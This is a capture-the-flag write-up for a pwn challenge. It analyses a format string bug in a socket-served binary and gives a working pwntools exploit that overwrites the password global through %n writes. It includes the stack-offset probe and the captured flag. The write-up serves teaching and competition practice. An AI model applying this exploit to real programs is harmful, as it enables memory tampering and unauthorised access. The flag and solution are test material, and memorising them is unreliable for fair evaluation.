---
title: reto18
challenge_type: Pwn
difficulty: Insane
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: We have a program running through a socket. Its input and output have been redirected through the socket so that you can use it as if you were running it on your own machine.
connections:
  - url: nct25.thehackerconclave.es:26018
attachments:
  - title: pwnme
    url: /assets/files/navarra-cyber-talent-25-4/reto18/pwnme
  - title: pwnme.c
    url: /assets/files/navarra-cyber-talent-25-4/reto18/pwnme.c
---

## Recon

The challenge provides a 64-bit ELF binary along with its source code:

```bash
$ file pwnme
pwnme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e4c8fb3de97a72875b0ec0a9600f4102a7ba2a7, for GNU/Linux 3.2.0, not stripped
```

By analyzing the code, we can see that the goal is to match the user input stored in `buffer` with a randomly generated password in order to obtain the flag.

```c
void vuln() {
    char buffer[128];
    memset(buffer, 0, sizeof(buffer));
    printf("Give me the password");

    for (int i=0;i<3;i++) {
        printf("\n");
        printf("password: ");

        fflush(stdout);

        scanf("%s", buffer);
        printf(buffer);

        if (strcmp(buffer, password) == 0){
            sprintf(comando, "cat /flag/flag.txt");
        }
    }
}
```

This code contains a **format string vulnerability** at the line `printf(buffer)`, much like the one found in [reto17](/competitions/navarra-cyber-talent-25-4/reto17/). Since we are given three attempts to enter the password, which is randomly generated and thus impossible to guess, we can exploit this vulnerability to overwrite the value of the password instead.

## Exploitation

First, we need to obtain the address of the `password` array, since this is the memory location we intend to overwrite:

```bash
$ nm pwnme | grep -E "password"
00000000004040c0 B password
```

Then, we must identify the position of our input buffer on the stack in relation to the format string arguments. To do this, we send a distinct marker string combined with several format specifiers:

```bash
$ nc nct25.thehackerconclave.es 26018
Give me the password
password: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAAAAAA.0xa.(nil).(nil).(nil).(nil).0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e7025.(nil).(nil).(nil)
```

This input sends the marker string `AAAAAAAA` followed by 15 `%p` format specifiers. The `%p` specifier prints each corresponding value from the stack as a pointer, allowing us to identify where our marker appears. By examining the output, we observe that our marker (`AAAAAAAA`, represented as `0x4141414141414141`), appears at the sixth position on the stack. Therefore, our format string offset is `6`.

With this information, we can use `pwntools` to exploit the vulnerability as follows:

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

password_addr = 0x4040c0
offset = 6

p = remote('nct25.thehackerconclave.es', 26018)

p.recvuntil(b'password')

# Attempt 1: Noop attempt
p.recvuntil(b'password: ')
p.sendline(b'dummy')

# Attempt 2: Overwrite password
p.recvuntil(b'password: ')
payload = fmtstr_payload(offset, {password_addr: 0x41414141}, write_size='byte')
p.sendline(payload)
leak = p.recvuntil(b'\n', drop=True)

# Attempt 3: Send the password
p.recvuntil(b': ')
p.sendline(b'AAAA')

response = p.recvall(timeout=5)

flag_match = re.search(b'conclave\{[a-f0-9]{32}\}', response)
if flag_match:
    flag = flag_match.group(0).decode()
    log.success(f"Flag: {flag}")
```

### How the exploit works

The first attempt is a no-operation step. Although it could be used to determine the stack offset programmatically, this is unnecessary since we have already identified the correct offset value.

With the correct offset identified, we create a format string payload to write the value `AAAA` (`0x41414141`) to the password's memory address. The `fmtstr_payload()` function from pwntools automatically generates a format string that uses `%n`-based writes to modify the memory at the specified address, placing the address at the appropriate stack position.

Finally, we simply send `AAAA` to the buffer. Since this now matches the overwritten password in memory, the application reveals the flag.

## Flag Capture

Executing the exploit retrieves the flag successfully:

```
[+] Opening connection to nct25.thehackerconclave.es on port 26018: Done
[+] Receiving all data: Done (70B)
[*] Closed connection to nct25.thehackerconclave.es port 26018
[+] Flag: conclave{f1b0f4b06ce8152caacaea0196215174}
```
